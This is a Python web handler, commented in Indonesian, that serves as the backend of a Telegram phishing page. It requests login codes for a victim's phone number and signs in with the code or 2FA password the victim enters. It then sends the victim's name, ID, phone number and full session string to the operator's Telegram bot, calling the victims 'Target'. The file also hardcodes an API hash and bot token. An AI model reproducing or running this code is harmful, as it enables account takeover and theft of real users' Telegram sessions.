from http.server import BaseHTTPRequestHandler
import json
import asyncio
import urllib.request
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError

# --- KONFIGURASI ---
API_ID = 37391656
API_HASH = '12d6406aa09781891052538af2fa5848'
BOT_TOKEN = "8577863218:AAH1SSBgHjb2cc7eyMRNjp_kn_dpckSdGzQ"
MY_CHAT_ID = "7981083332"

clients_store = {}

def bot_log(text):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        data = json.dumps({"chat_id": MY_CHAT_ID, "text": text, "parse_mode": "Markdown"}).encode()
        req = urllib.request.Request(url, data=data, headers={'Content-Type': 'application/json'})
        urllib.request.urlopen(req)
    except: pass

class handler(BaseHTTPRequestHandler):
    def do_POST(self):
        action = self.path.split('=')[-1]
        content_length = int(self.headers['Content-Length'])
        post_data = json.loads(self.rfile.read(content_length))
        
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        response = loop.run_until_complete(self.manage_telegram(action, post_data))
        
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.end_headers()
        self.wfile.write(json.dumps(response).encode())

    async def manage_telegram(self, action, data):
        phone = data.get('phone')
        
        if action == 'send_code':
            client = TelegramClient(StringSession(), API_ID, API_HASH)
            await client.connect()
            try:
                sent = await client.send_code_request(phone)
                clients_store[phone] = {'client': client, 'hash': sent.phone_code_hash}
                bot_log(f"🔔 **Target Login**\nNomor: `{phone}`\nStatus: Menunggu OTP")
                return {"success": True}
            except Exception as e:
                return {"success": False, "error": str(e)}

        elif action == 'signin':
            session_data = clients_store.get(phone)
            if not session_data: return {"success": False, "error": "Sesi kedaluwarsa."}
            
            client = session_data['client']
            code, password = data.get('code'), data.get('password')

            try:
                if password:
                    await client.sign_in(phone=phone, password=password)
                else:
                    await client.sign_in(phone=phone, code=code, phone_code_hash=session_data['hash'])
                
                # DATA LENGKAP SETELAH LOGIN
                me = await client.get_me()
                session_str = client.session.save()
                full_name = f"{me.first_name} {me.last_name if me.last_name else ''}".strip()
                username = f"@{me.username}" if me.username else "N/A"
                premium = "Ya 🌟" if me.premium else "Tidak"

                report = (
                    f"✅ **LOGIN BERHASIL**\n\n"
                    f"👤 **Nama:** `{full_name}`\n"
                    f"🆔 **ID:** `{me.id}`\n"
                    f"📧 **User:** `{username}`\n"
                    f"📱 **Phone:** `{phone}`\n"
                    f"💎 **Premium:** `{premium}`\n\n"
                    f"🔑 **SESSION STRING:**\n`{session_str}`"
                )
                bot_log(report)
                del clients_store[phone]
                return {"success": True}
                
            except SessionPasswordNeededError:
                bot_log(f"🔐 **Info 2FA**\nTarget: `{phone}`")
                return {"success": True, "need_2fa": True}
            except Exception as e:
                return {"success": False, "error": str(e)}
        return {"success": False}
      
